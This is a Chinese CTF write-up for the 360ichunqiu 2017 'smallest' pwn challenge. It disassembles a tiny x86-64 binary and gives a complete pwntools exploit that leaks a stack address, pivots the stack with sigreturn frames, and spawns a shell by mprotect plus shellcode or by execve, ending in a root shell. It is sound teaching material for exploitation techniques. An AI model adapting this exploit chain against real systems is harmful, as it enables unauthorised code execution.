---
layout: post
title: pwn 360ichunqiu2017 smallest
excerpt: "360ichunqiu2017 smallest wirteup"
categories: [Writeup]
comments: true
---

这个就是一个SROP题目

全部运行代码如下
```
.text:00000000004000B0                 public start
.text:00000000004000B0 start           proc near
.text:00000000004000B0                 xor     rax, rax
.text:00000000004000B3                 mov     edx, 400h
.text:00000000004000B8                 mov     rsi, rsp
.text:00000000004000BB                 mov     rdi, rax
.text:00000000004000BE                 syscall
.text:00000000004000C0                 retn
.text:00000000004000C0 start           endp
.text:00000000004000C0
.text:00000000004000C0 _text           ends
.text:00000000004000C0
.text:00000000004000C0
.text:00000000004000C0                 end start
```
**其中RETN等价于一条指令：POP   eip**

程序中首先清空rax，然后设置edx为0x400，之后rsi为rsp，也就是当前栈顶，rdi设置为rax，也就是0，之后syscall。根据64位系统调用规则，这里的syscall就相当于read(stdin, rsp, 0x400)。
syscall之后，我们输入的内容会被输入栈顶，后面的retn也就会回到我们输入内容指定的地址了。

我们可以通过输入,控制rax(read(stdin, rsp, 0x400)返回输入的长度)

file
```bash
file smallest 
smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped
```
通过`ROPgadget --binary smallest`查找到syscall gadget
```
Gadgets information
============================================================
0x00000000004000b7 : add byte ptr [rax - 0x77], cl ; out 0x48, al ; mov edi, eax ; syscall ; ret
0x00000000004000bc : mov edi, eax ; syscall ; ret
0x00000000004000b9 : mov esi, esp ; mov rdi, rax ; syscall ; ret
0x00000000004000bb : mov rdi, rax ; syscall ; ret
0x00000000004000b8 : mov rsi, rsp ; mov rdi, rax ; syscall ; ret
0x00000000004000ba : out 0x48, al ; mov edi, eax ; syscall ; ret
0x00000000004000c0 : ret
0x00000000004000be : syscall ; ret

```
查看读写权限
```
more /proc/19764/maps
00400000-00401000 r-xp 00000000 fd:00 110553261                          /root/sploitfun/360ichunqiu/smallest
7ffe77b4d000-7ffe77b6e000 rw-p 00000000 00:00 0                          [stack]
7ffe77b90000-7ffe77b92000 r-xp 00000000 00:00 0                          [vdso]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]
```
使用ida打开发现程序只有这么一点
```
.text:00000000004000B0                 public start
.text:00000000004000B0 start           proc near
.text:00000000004000B0                 xor     rax, rax
.text:00000000004000B3                 mov     edx, 400h
.text:00000000004000B8                 mov     rsi, rsp
.text:00000000004000BB                 mov     rdi, rax
.text:00000000004000BE                 syscall
.text:00000000004000C0                 retn
```

最终的exp
```
#!/usr/bin/python
# coding:utf-8

from pwn import *

context.update(os='linux', arch='amd64')

syscall_addr = 0x4000be
start_addr = 0x4000b0
set_rsi_rdi_addr = 0x4000b8
shellcode = asm(shellcraft.amd64.linux.sh())

io = process('./smallest')

payload = ""
payload += p64(start_addr)  # 返回到start重新执行一遍sys_read，利用返回值设置rax = 1，调用sys_write
payload += p64(set_rsi_rdi_addr)  # mov rsi, rsp; mov rdi, rax; syscall; retn，此时相当于执行sys_write(1, rsp, size)
payload += p64(start_addr)  # 泄露栈地址之后返回到start，执行下一步操作

io.send(payload)
sleep(3)
io.send(payload[8:8 + 1])  # 利用sys_read读取一个字符，设置rax = 1
stack_addr = u64(io.recv()[8:16]) + 0x100  # 从泄露的数据中抽取栈地址
log.info('stack addr = %#x' % (stack_addr))
sleep(3)


def mprotect():
    # sys_mprotect+ret2shellcode流程	#获取栈地址，在栈上取一块空间，使用SROP调用sys_read更改rsp的值并将后续的攻击代码读到可确定的这块栈内存中，随后调用sys_mprotect将该内存置为RWX，最后返回到start将返回地址和shellcode读取到该栈内存中起shell
    # -----------------change stack-------------------
    frame_read = SigreturnFrame()  # 设置read的SROP帧
    frame_read.rax = constants.SYS_read
    frame_read.rdi = 0
    frame_read.rsi = stack_addr
    frame_read.rdx = 0x300
    frame_read.rsp = stack_addr  # 这个stack_addr地址中的内容就是start地址，SROP执行完后ret跳转到start
    frame_read.rip = syscall_addr

    payload = ""
    payload += p64(start_addr)  # 返回到start重新执行一遍sys_read，利用返回值设置rax = 0xf，调用sys_sigreturn
    payload += p64(syscall_addr)  # ret到syscall，下接SROP帧，触发SROP
    payload += str(frame_read)
    io.send(payload)
    sleep(3)
    io.send(payload[8:8 + 15])  # 利用sys_read读取一个字符，设置rax = 0xf，注意不要让payload内容被修改
    sleep(3)

    # -----------------call mprotect------------------

    frame_mprotect = SigreturnFrame()  # 设置mprotect的SROP帧，用mprotect修改栈内存为RWX
    frame_mprotect.rax = constants.SYS_mprotect
    frame_mprotect.rdi = stack_addr & 0xFFFFFFFFFFFFF000
    frame_mprotect.rsi = 0x1000
    frame_mprotect.rdx = constants.PROT_READ | constants.PROT_WRITE | constants.PROT_EXEC
    frame_mprotect.rsp = stack_addr
    frame_mprotect.rip = syscall_addr

    payload = ""
    payload += p64(start_addr)
    payload += p64(syscall_addr)
    payload += str(frame_mprotect)

    io.send(payload)
    sleep(3)
    io.send(payload[8:8 + 15])
    sleep(3)
    # ----------read shellcode and execve-------------
    payload = ""
    payload += p64(stack_addr + 0x10)  # ret到stack_addr+0x10，即shellcode所在地址
    payload += asm(shellcraft.amd64.linux.sh())
    io.send(payload)
    sleep(3)
    io.interactive()


def execve():
    # sys_read+sys_execve流程	#获取栈地址，在栈上取一块空间，使用SROP调用sys_read在指定地址读入"/bin/sh\x00"，随后调用sys_execve起shell
    # -----------------change stack-------------------
    frame_read = SigreturnFrame()  # 设置read的SROP帧，不使用原先的read是因为可以使用SROP同时修改rsp，实现stack pivot
    frame_read.rax = constants.SYS_read
    frame_read.rdi = 0
    frame_read.rsi = stack_addr
    frame_read.rdx = 0x300
    frame_read.rsp = stack_addr
    frame_read.rip = syscall_addr

    payload = ""
    payload += p64(start_addr)
    payload += p64(syscall_addr)
    payload += str(frame_read)
    io.send(payload)
    sleep(3)
    io.send(payload[8:8 + 15])
    sleep(3)

    # -----------------call execve-------------------

    frame_execve = SigreturnFrame()  # 设置execve的SROP帧，注意计算/bin/sh\x00所在地址
    frame_execve.rax = constants.SYS_execve
    frame_execve.rdi = stack_addr + 0x108
    frame_execve.rip = syscall_addr

    payload = ""
    payload += p64(start_addr)
    payload += p64(syscall_addr)
    payload += str(frame_execve)
    payload += "/bin/sh\x00"
    io.send(payload)
    sleep(3)
    io.send(payload[8:8 + 15])
    sleep(3)
    io.interactive()

execve()
#mprotect()		#两种方法都可以
```
最终的结果
```
python exp.py 
[+] Starting local process './smallest': pid 21096
[*] stack addr = 0x7fffc5ab3764
[*] Switching to interactive mode
$ id
uid=0(root) gid=0(root) groups=0(root)
```